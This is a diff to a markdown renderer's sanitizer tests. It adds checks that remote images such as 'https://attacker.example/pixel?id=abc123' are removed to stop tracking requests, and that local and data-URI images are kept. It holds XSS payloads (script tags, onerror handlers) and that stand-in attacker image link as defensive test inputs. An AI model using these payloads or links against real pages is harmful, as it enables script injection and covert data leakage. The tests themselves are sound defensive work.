@@ -12,10 +12,11 @@ describe("markdown", () => {
 
   it("strips dangerous markup and attributes while preserving safe content", () => {
     const html = renderMarkdown(
-      '<script>alert(1)</script><img src="https://example.com/image.png" onerror="alert(1)" class="safe" data-test="drop-me">',
+      '<script>alert(1)</script><img src="/image.png" onerror="alert(1)" class="safe" data-test="drop-me">',
     );
 
     expect(html).not.toContain("<script");
+    expect(html).toContain("<img");
     expect(html).not.toContain("onerror=");
     expect(html).not.toContain("data-test=");
   });
@@ -106,6 +107,28 @@ describe("markdown", () => {
     });
   });
 
+  it("removes remote markdown images that would trigger browser tracking requests", () => {
+    const html = renderMarkdown(
+      "![x](https://attacker.example/pixel?id=abc123)",
+    );
+
+    expect(html).not.toContain("<img");
+    expect(html).not.toContain("attacker.example");
+    expect(html).not.toContain("pixel?id=");
+  });
+
+  it("preserves local and non-network markdown images", () => {
+    expect(renderMarkdown("![local](/attachments/image.png)")).toContain(
+      '<img src="/attachments/image.png"',
+    );
+    expect(renderMarkdown("![relative](./image.png)")).toContain(
+      '<img src="./image.png"',
+    );
+    expect(renderMarkdown("![inline](data:image/png;base64,AAAA)")).toContain(
+      '<img src="data:image/png;base64,AAAA"',
+    );
+  });
+
   it("strips script, iframe, object, and embed tags", () => {
     const cases = [
       { input: "<script>alert(1)</script>", shouldNotContain: "<script" },
@@ -159,9 +182,7 @@ describe("markdown", () => {
       "<table",
     );
     expect(renderMarkdown("[link](https://example.com)")).toContain("<a");
-    expect(renderMarkdown("![alt](https://example.com/img.png)")).toContain(
-      "<img",
-    );
+    expect(renderMarkdown("![alt](/img.png)")).toContain("<img");
     expect(renderMarkdown("> quote")).toContain("<blockquote");
     expect(renderMarkdown("**bold**")).toContain("<strong");
     expect(renderMarkdown("*italic*")).toContain("<em");
